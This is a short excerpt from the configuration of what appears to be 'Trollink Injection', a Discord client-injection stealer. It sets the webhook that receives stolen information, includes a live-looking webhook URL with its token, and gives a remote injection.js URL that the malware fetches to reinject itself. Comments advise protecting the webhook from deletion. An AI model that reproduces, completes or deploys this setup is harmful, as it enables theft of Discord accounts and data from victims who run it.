...
const config = {
  webhook: 'https://discord.com/api/webhooks/1221760465164566548/vMbT7HCMkjqVhREFkPoAU1sUsayH94IOTOuav3wiHura6UPwhMHwp-PzWdi9gLoFXhOf', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  ...
  embed_name: 'Trollink Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://imgur.com/a/C1tQeMY', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/w2rr2w2/trollink-injection/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By trollink',
        },
      },
    ],
  };
